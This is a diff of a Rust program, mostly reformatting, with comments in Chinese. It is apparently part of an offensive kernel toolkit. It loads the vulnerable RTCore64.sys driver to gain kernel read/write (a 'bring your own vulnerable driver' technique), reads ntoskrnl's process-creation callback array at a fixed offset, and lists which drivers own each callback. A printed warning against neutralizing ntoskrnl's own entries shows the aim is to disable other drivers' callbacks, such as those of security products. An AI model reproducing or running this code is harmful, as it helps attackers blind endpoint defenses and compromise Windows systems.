@@ -18,24 +18,52 @@ use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
 use nyx_operator_kernelsdk::KernelRw;
 
 const SYS_PATH: &[u16] = &[
-    'S' as u16, 'y' as u16, 's' as u16, 't' as u16, 'e' as u16, 'm' as u16,
-    '3' as u16, '2' as u16, '\\' as u16, 'd' as u16, 'r' as u16, 'i' as u16,
-    'v' as u16, 'e' as u16, 'r' as u16, 's' as u16, '\\' as u16,
-    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16,
-    '6' as u16, '4' as u16, '.' as u16, 's' as u16, 'y' as u16, 's' as u16, 0,
+    'S' as u16,
+    'y' as u16,
+    's' as u16,
+    't' as u16,
+    'e' as u16,
+    'm' as u16,
+    '3' as u16,
+    '2' as u16,
+    '\\' as u16,
+    'd' as u16,
+    'r' as u16,
+    'i' as u16,
+    'v' as u16,
+    'e' as u16,
+    'r' as u16,
+    's' as u16,
+    '\\' as u16,
+    'R' as u16,
+    'T' as u16,
+    'C' as u16,
+    'o' as u16,
+    'r' as u16,
+    'e' as u16,
+    '6' as u16,
+    '4' as u16,
+    '.' as u16,
+    's' as u16,
+    'y' as u16,
+    's' as u16,
+    0,
 ];
 const SVC_NAME: &[u16] = &[
-    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16,
-    '6' as u16, '4' as u16,
+    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
 const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;
 const SYSTEM_MODULE_INFORMATION: u32 = 11;
 
 extern "system" {
-    fn RtlAdjustPrivilege(privilege: u32, enable: i32, current_thread: i32,
-                          enabled: *mut i32) -> i32;
-    fn NtQuerySystemInformation(class: u32, buf: *mut c_void, buflen: u32,
-                                retlen: *mut u32) -> i32;
+    fn RtlAdjustPrivilege(
+        privilege: u32,
+        enable: i32,
+        current_thread: i32,
+        enabled: *mut i32,
+    ) -> i32;
+    fn NtQuerySystemInformation(class: u32, buf: *mut c_void, buflen: u32, retlen: *mut u32)
+        -> i32;
 }
 fn enable_privileges() {
     for luid in [10u32, 20u32] {
@@ -57,7 +85,7 @@ struct RtlModule {
     flags: u32,
     // 后面 LoadOrderIndex/InitOrderIndex/LoadCount/NameOffset (各 u16) + 256 字节路径。
     // 我们不读这些 u16，直接把后续 256 字节当 full_path。
-    tail: [u8; 264],   // 4*2 (u16s) + 256 path, 留余量
+    tail: [u8; 264], // 4*2 (u16s) + 256 path, 留余量
 }
 
 /// 拿全部已加载内核驱动的 (base, size, 短名)。
@@ -65,23 +93,39 @@ fn loaded_kernel_modules() -> Vec<(usize, usize, String)> {
     let mut buf = vec![0u8; 256 * 1024];
     let mut retlen: u32 = 0;
     let status = unsafe {
-        NtQuerySystemInformation(SYSTEM_MODULE_INFORMATION, buf.as_mut_ptr() as *mut c_void,
-                                 buf.len() as u32, &mut retlen)
+        NtQuerySystemInformation(
+            SYSTEM_MODULE_INFORMATION,
+            buf.as_mut_ptr() as *mut c_void,
+            buf.len() as u32,
+            &mut retlen,
+        )
     };
     if status as u32 == 0xC0000004 {
         buf = vec![0u8; retlen as usize + 0x1000];
         let s = unsafe {
-            NtQuerySystemInformation(SYSTEM_MODULE_INFORMATION, buf.as_mut_ptr() as *mut c_void,
-                                     buf.len() as u32, &mut retlen)
+            NtQuerySystemInformation(
+                SYSTEM_MODULE_INFORMATION,
+                buf.as_mut_ptr() as *mut c_void,
+                buf.len() as u32,
+                &mut retlen,
+            )
         };
-        if s < 0 { return Vec::new(); }
+        if s < 0 {
+            return Vec::new();
+        }
     } else if status < 0 {
         return Vec::new();
     }
-    if buf.len() < 8 { return Vec::new(); }
+    if buf.len() < 8 {
+        return Vec::new();
+    }
     let count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
-    eprintln!("[dbg] NtQuerySystemInformation: count={}, retlen={}, buf.len()={}",
-              count, retlen, buf.len());
+    eprintln!(
+        "[dbg] NtQuerySystemInformation: count={}, retlen={}, buf.len()={}",
+        count,
+        retlen,
+        buf.len()
+    );
     // RTL_PROCESS_MODULE_INFORMATION entry stride. 实测: 读 Module[0] 的
     // image_base 正确（kernel_base.rs 用 304）。但跨 entry 步进需核对 —— 不同
     // SDK 文档给 280/296/304。用反推法：Module[0].ImageBase 在 entry+0x18，
@@ -96,35 +140,49 @@ fn loaded_kernel_modules() -> Vec<(usize, usize, String)> {
     let real_stride = if count >= 2 {
         let mut s = ENTRY_SIZE;
         for cand in (288..=312usize).step_by(4) {
-            let off1 = 8 + cand + 0x10;  // entry[1].ImageBase
-            if off1 + 8 > buf.len() { break; }
-            let b1 = u64::from_le_bytes(buf[off1..off1+8].try_into().unwrap_or([0;8]));
+            let off1 = 8 + cand + 0x10; // entry[1].ImageBase
+            if off1 + 8 > buf.len() {
+                break;
+            }
+            let b1 = u64::from_le_bytes(buf[off1..off1 + 8].try_into().unwrap_or([0; 8]));
             if b1 >= 0xFFFFF800_00000000 && b1 <= 0xFFFFFFFF_FFFFFFFF {
                 s = cand;
                 break;
             }
         }
         s
-    } else { ENTRY_SIZE };
+    } else {
+        ENTRY_SIZE
+    };
     eprintln!("[dbg] entry stride = {}", real_stride);
     let mut dumped = 0usize;
     for i in 0..count {
         let off = 8 + i * real_stride;
-        if off + real_stride > buf.len() { break; }
+        if off + real_stride > buf.len() {
+            break;
+        }
         let m: &RtlModule = unsafe { &*(buf.as_ptr().add(off) as *const RtlModule) };
         let base = m.image_base as usize;
         if dumped < 25 {
             let path = &m.tail[8..];
             let nul = path.iter().position(|&b| b == 0).unwrap_or(32);
-            eprintln!("[dbg] entry[{}] off=0x{:X} base=0x{:016X} size=0x{:X} name='{}'",
-                      i, off, base, m.image_size, String::from_utf8_lossy(&path[..nul.min(48)]));
+            eprintln!(
+                "[dbg] entry[{}] off=0x{:X} base=0x{:016X} size=0x{:X} name='{}'",
+                i,
+                off,
+                base,
+                m.image_size,
+                String::from_utf8_lossy(&path[..nul.min(48)])
+            );
             dumped += 1;
         }
-        if base == 0 { continue; }
+        if base == 0 {
+            continue;
+        }
         // tail 布局: [8 字节 u16 字段][256 字节 full_path]。
         // 短名 = full_path 里最后一个 '\' 之后的部分。
-        let path = &m.tail[8..];  // full_path 起点
-        // 找 NUL 终止
+        let path = &m.tail[8..]; // full_path 起点
+                                 // 找 NUL 终止
         let nul = path.iter().position(|&b| b == 0).unwrap_or(path.len());
         let path_str = &path[..nul];
         // 找最后一个 '\'
@@ -156,32 +214,55 @@ fn main() {
     let (mut loaded, krw) = unsafe {
         match bootstrap_byovd(SYS_PATH, SVC_NAME) {
             Ok(t) => t,
-            Err(e) => { eprintln!("[FAIL] bootstrap: {}", e); std::process::exit(1); }
+            Err(e) => {
+                eprintln!("[FAIL] bootstrap: {}", e);
+                std::process::exit(1);
+            }
         }
     };
     let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
     let array_kva = base + PSP_CREATE_PROCESS_NOTIFY_RVA as usize;
-    println!("ntoskrnl base=0x{:016x}  array=0x{:016x}\n", base, array_kva);
+    println!(
+        "ntoskrnl base=0x{:016x}  array=0x{:016x}\n",
+        base, array_kva
+    );
 
     let mods = loaded_kernel_modules();
     println!("loaded kernel modules: {}", mods.len());
 
     println!("\n=== CreateProcess callback owners ===");
     for i in 0..notify_routines::ARRAY_LEN {
-        let packed = match krw.kread_u64(array_kva + i * 8) { Ok(v) => v, Err(_) => continue };
-        if !notify_routines::is_occupied(packed) { continue; }
+        let packed = match krw.kread_u64(array_kva + i * 8) {
+            Ok(v) => v,
+            Err(_) => continue,
+        };
+        if !notify_routines::is_occupied(packed) {
+            continue;
+        }
         let ctx = notify_routines::unpack(packed) as usize;
-        let routine = krw.kread_u64(ctx).map(|v| (v & notify_routines::PTR_MASK) as usize).unwrap_or(0);
-        if routine == 0 { continue; }
+        let routine = krw
+            .kread_u64(ctx)
+            .map(|v| (v & notify_routines::PTR_MASK) as usize)
+            .unwrap_or(0);
+        if routine == 0 {
+            continue;
+        }
         match owner_of(routine, &mods) {
             Some((name, rva)) => {
                 let tag = if name.eq_ignore_ascii_case("ntoskrnl.exe") {
                     "  <-- NTOSKRNL INTERNAL (do NOT neutralize: causes triple fault)"
-                } else { "" };
-                println!("  slot[{:2}] routine=0x{:016x} ctx=0x{:016x} -> {} +0x{:X}{}",
-                         i, routine, ctx, name, rva, tag);
+                } else {
+                    ""
+                };
+                println!(
+                    "  slot[{:2}] routine=0x{:016x} ctx=0x{:016x} -> {} +0x{:X}{}",
+                    i, routine, ctx, name, rva, tag
+                );
             }
-            None => println!("  slot[{:2}] routine=0x{:016x} -> (owner unknown / unmapped)", i, routine),
+            None => println!(
+                "  slot[{:2}] routine=0x{:016x} -> (owner unknown / unmapped)",
+                i, routine
+            ),
         }
     }
 
